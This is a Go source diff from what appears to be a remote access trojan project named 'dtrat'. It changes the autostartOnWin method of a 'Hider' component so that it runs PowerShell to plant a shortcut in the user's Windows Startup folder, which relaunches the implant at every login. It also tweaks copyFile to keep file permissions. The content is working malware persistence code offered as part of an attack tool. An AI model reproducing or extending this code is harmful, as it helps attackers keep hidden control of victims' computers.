@@ -5,6 +5,7 @@ import (
 	"dtrat/errs"
 	"fmt"
 	"os"
+	"os/exec"
 	"path/filepath"
 	"runtime"
 )
@@ -21,21 +22,28 @@ func NewHider(eng *engine.Engine) (*Hider, error) {
 }
 
 func (h *Hider) autostartOnWin(executablePath string) error {
-	var startupPath string
-	admin := h.eng.Info.IsRoot()
+	startupPath := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
 
-	if admin {
-		startupPath = filepath.Join(os.Getenv("ProgramData"), "Microsoft\\Windows\\Start Menu\\Programs\\StartUp")
-	} else {
-		startupPath = filepath.Join(os.Getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
-	}
+	exeName := filepath.Base(executablePath)
+	lnkName := exeName[:len(exeName)-len(filepath.Ext(exeName))] + ".lnk"
+	destPath := filepath.Join(startupPath, lnkName)
 
-	destPath := filepath.Join(startupPath, filepath.Base(executablePath))
+	psCommand := fmt.Sprintf(
+		`$WshShell = New-Object -ComObject WScript.Shell; `+
+			`$Shortcut = $WshShell.CreateShortcut('%s'); `+
+			`$Shortcut.TargetPath = '%s'; `+
+			`$Shortcut.WorkingDirectory = '%s'; `+
+			`$Shortcut.Save()`,
+		destPath, executablePath, filepath.Dir(executablePath),
+	)
 
-	err := copyFile(executablePath, destPath)
+	cmd := exec.Command("powershell", "-Command", psCommand)
+
+	output, err := cmd.CombinedOutput()
 	if err != nil {
-		return fmt.Errorf("copyFile: %w", err)
+		return fmt.Errorf("failed to create shortcut via PowerShell: %w (output: %s)", err, string(output))
 	}
+
 	return nil
 }
 
@@ -92,6 +100,15 @@ func copyFile(src, dst string) error {
 		return err
 	}
 
-	err = os.WriteFile(dst, input, 0644)
-	return err
+	info, err := os.Stat(src)
+	if err != nil {
+		return err
+	}
+
+	err = os.WriteFile(dst, input, info.Mode())
+	if err != nil {
+		return err
+	}
+
+	return nil
 }
